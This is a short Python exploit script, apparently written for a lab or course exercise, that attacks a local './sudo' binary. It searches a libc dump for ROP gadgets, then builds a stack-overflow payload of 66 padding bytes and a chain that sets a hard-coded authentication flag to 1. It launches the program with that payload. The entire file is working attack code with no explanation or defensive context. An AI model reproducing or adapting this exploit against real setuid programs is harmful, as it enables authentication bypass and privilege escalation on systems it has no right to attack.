import os
import sys
import struct

import assemble
from search import GadgetSearch

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
DUMP_START_ADDR = 0xb7c39750
AUTH_ADDR = 0x0804A054
FINAL_RET_ADDR = 0x080488c6


def get_arg():
    s = GadgetSearch(LIBC_DUMP_PATH, DUMP_START_ADDR)
    possible_regs = [
        'eax', 'ebx', 'ecx', 'edx', 'esi', 'edi'
    ]
    # for every couple of registers we search for our wanted
    # set of instructions, if we find 2 registers that satisfy
    # all instructions we break and proceed
    for perm in s.get_register_combos(2, possible_regs):
        reg1 = perm[0]
        reg2 = perm[1]
        pop_all = s.find_all('pop {0}'.format(reg1))
        if(len(pop_all) == 0):
            continue  # didnt find instruction with reg1
        xor_all = s.find_all('xor {0},{0}'.format(reg2))
        if(len(xor_all) == 0):
            continue  # didnt find instruction with reg2
        inc_all = s.find_all('inc {0}'.format(reg2))
        if(len(inc_all) == 0):
            continue  # didnt find instruction with reg2
        mov_all = s.find_all('mov [{0}],{1}'.format(reg1, reg2))
        if(len(mov_all) == 0):
            continue  # didnt find instruction with reg2
        # if got to this point then we found 2 suitable registers
        # and addresses to instructions that we need
        pop_reg1 = pop_all[0]
        xor_reg2_reg2 = xor_all[0]
        inc_reg2 = inc_all[0]
        mov_memReg1_reg2 = mov_all[0]
        break

    offset = 66
    buf = 'a' * offset
    shellcode = buf + struct.pack('<IIIIII', pop_reg1, AUTH_ADDR, xor_reg2_reg2,
                                  inc_reg2, mov_memReg1_reg2, FINAL_RET_ADDR)
    return shellcode


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
